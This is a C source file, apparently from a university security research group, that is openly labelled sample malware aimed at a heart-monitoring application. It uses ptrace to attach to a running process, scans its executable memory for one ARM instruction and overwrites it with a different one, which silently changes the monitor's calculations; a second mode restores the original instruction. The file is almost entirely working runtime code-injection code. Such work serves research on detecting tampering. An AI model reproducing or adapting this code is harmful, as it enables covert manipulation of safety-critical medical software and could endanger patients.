/*---------------------------------------------------------------------
----                                                               ----
---- my_sample_malware - a sample malware written to attack a      ----
---- heart monitoring application by changing the code segment in  ----
---- memory at runtime                                             ----
----                                                               ----
---- Author(s):                                                    ----
---- - Taimour Wehbe, taimour.wehbe@gatech.edu                     ----
----                                                               ----
-----------------------------------------------------------------------
----                                                               ----
----                                                               ----
---- Hardware/Software Codesign for Security Group                 ----
---- Copyright (C) 2018 Georgia Institute of Technology            ----
----                                                               ----
----                                                               ----
---------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <string.h>
#include <time.h>
#include <sys/time.h>

int mem_region_num = 1;
int page_num = 1;
struct timeval malware_t;

void dump_memory_region(int pid, int choice, int fdMemFile, unsigned long start_address, long length)
{
    page_num = 1;

    unsigned long address;
    int pageLength = 4096;
    unsigned char page[pageLength];

    for (address=start_address; address < start_address + length; address += pageLength)
    {
        pread(fdMemFile, &page, sizeof(page), address);
        int i;
        if (choice == 1)
        {
            for (i=0; i<pageLength-3; i++) {
                //modify the contents to launch the attack
                //we need to change:
                //    02 30 63 E0        rsb r3, r3, r2
                //to:
                //    03 30 82 E0        add r3, r2, r3
                if ((page[i] == 2) && (page[i+1] == 48) && (page[i+2] == 99) && (page[i+3] == 224))
                {
                    unsigned long address_of_data = address+i;
                    unsigned long word = 0;
                    word = 0xE0823003;
                    gettimeofday(&malware_t, NULL);
                    unsigned long ret = ptrace(PTRACE_POKETEXT, pid, address_of_data, word);
                    
                    printf("Malware started at: %ld microseconds\n", malware_t.tv_sec * 1000000 + malware_t.tv_usec);
                    if (ret < 0)
                        exit(0);
                    break;
                }
            }
        }
        if (choice == 0)
        {
            for (i=0; i<pageLength-3; i++) {
                //modify the contents back to their original values
                //we need to change:
                //    03 30 82 E0        add r3, r2, r3
                //to:
                //    02 30 63 E0        rsb r3, r3, r2
                if ((page[i] == 3) && (page[i+1] == 48) && (page[i+2] == 130) && (page[i+3] == 224))
                {
                    unsigned long address_of_data = address+i;
                    unsigned long word = 0;
                    word = 0xE0633002;
                    unsigned long ret = ptrace(PTRACE_POKETEXT, pid, address_of_data, word);
                    if (ret < 0)
                        exit(0);
                    break;
                }
            }
        }
    }
}

int main(int argc, char **argv) {

    if (argc == 3)
    {
        int choice = atoi(argv[1]);
        int pid = atoi(argv[2]);
        long ptraceResult = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
        if (ptraceResult < 0)
        {
            printf("Unable to attach to the pid specified\n");
            return -1;
        }
        wait(NULL);

        char mapsFilename[1024];
        sprintf(mapsFilename, "/proc/%s/maps", argv[2]);
        FILE* pMapsFile = fopen(mapsFilename, "r");
        char memFilename[1024];
        sprintf(memFilename, "/proc/%s/mem", argv[2]);
        int fdMemFile = open(memFilename, O_RDWR);
        char line[256];

        while (fgets(line, 256, pMapsFile) != NULL)
        {
            unsigned long start_address;
            unsigned long end_address;
            char *start_address_c, *end_address_c;
            char *rest = line;
            start_address_c = strtok_r(rest, "-", &rest);
            end_address_c = strtok_r(rest, " ", &rest);
            sscanf(start_address_c, "%lx", &start_address);
            sscanf(end_address_c, "%lx", &end_address);
            if (rest[2] == 'x')
                dump_memory_region(pid, choice, fdMemFile, start_address, end_address - start_address);
            else
                break;
        }

        fclose(pMapsFile);
        close(fdMemFile);

        ptrace(PTRACE_CONT, pid, NULL, NULL);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);

	sleep(30);
    }
    else
    {
        printf("%s <mode> <pid>           mode = 1 to launch malware / 0 to restore normal operation\n", argv[0]);
        exit(0);
    }
}
